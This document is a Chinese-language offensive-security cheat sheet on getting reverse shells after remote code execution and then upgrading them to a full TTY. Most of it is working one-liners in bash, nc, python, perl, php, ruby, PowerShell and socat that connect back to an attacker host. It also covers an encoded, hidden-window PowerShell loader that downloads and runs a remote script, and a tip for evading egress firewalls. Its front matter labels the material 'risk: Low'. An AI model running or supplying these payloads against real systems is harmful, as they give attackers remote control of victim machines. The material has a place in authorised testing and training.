---
cmd_type: Shell
service: ReverseShell
os: General
tags:
  - cmd
syntax: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
risk: Low
---

# 反向 Shell 与 TTY 升级

## 用途 / 适用场景

拿到 RCE 后，把目标机的命令行"弹"回自己的攻击机，获得可交互的 shell。适用于：命令执行点无法直接交互、目标在 NAT 后、需要稳定持久会话时。弹回后必须做 TTY 升级，否则没有 tab 补全、无法 Ctrl+C、无法运行 sudo/su 等交互程序。

先在本机监听：

```bash
nc -lvnp <LPORT>
```

## 关键命令：全语言一句话

### bash

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

> Ubuntu 的 /bin/sh 是 dash，没有 /dev/tcp，必须用 bash -c 包装：

```bash
/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### nc（有 -e 版本）

```bash
nc <LHOST> <LPORT> -e /bin/sh
```

### nc（无 -e，mkfifo 版本）

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f
```

### python3

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### python2

```bash
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### perl

```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### php

```bash
php -r '$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### ruby

```bash
ruby -rsocket -e 'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell（-nop -w hidden -enc）

原始一句话（-nop -c 内联版）：

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

把上面的命令体转成 UTF-16LE 的 Base64，再用 -enc 加载（绕引号/换行问题）：

```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

```powershell
powershell -nop -w hidden -enc <BASE64>
```

### socat

```bash
socat TCP:<LHOST>:<LPORT> EXEC:/bin/sh
```

## 参数说明

| 占位符 | 含义 |
| --- | --- |
| <LHOST> | 攻击机监听 IP |
| <LPORT> | 攻击机监听端口 |
| <BASE64> | PowerShell 载荷的 UTF-16LE Base64 |

## 实战流程：TTY 升级三步

拿到裸 shell 后按顺序做：

```bash
# 1. 升级到伪终端
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
# 2. 挂起当前 shell（Ctrl+Z），在本地设置 raw 模式后切回
#    （在攻击机上输入）
stty raw -echo; fg
```

```bash
# 3. 设置终端类型和窗口大小
export TERM=xterm
stty rows 47 cols 200
```

验证是否成功：

```bash
# 能出现这个提示 = 升级成功，可正常 Ctrl+C、tab 补全
id && whoami && echo $SHELL
```

### rlwrap 版本（监听时直接带历史/补全）

```bash
rlwrap nc -lvnp <LPORT>
```

### socat 全功能监听（弹回即完整 TTY）

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

## 常见坑

1. Ubuntu /bin/sh 是 dash，没有 /dev/tcp——bash 一句话在 sh 里静默失败，改用 `bash -c` 包装。
2. 裸 shell 里 `sudo`、`su`、`vim` 会报错或卡死——先做 TTY 升级。
3. `stty raw -echo; fg` 失败通常是因为漏了 Ctrl+Z 挂起这步，或本地 shell 不是 bash。
4. 忘记 `export TERM=xterm`，vim/less 会花屏。
5. PowerShell 内联版里含大量引号和 `$`，直接在 cmd 里贴会被截断——优先走 -enc Base64。
6. 目标出网受限时用 `bash -i` 走 443/80 端口，规避出口防火墙。

## 参考开源项目

- PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings
- revshells.com — https://www.revshells.com/
- pwncat-cs — https://github.com/calebstewart/pwncat
- socat — https://github.com/3ndG4me/socat
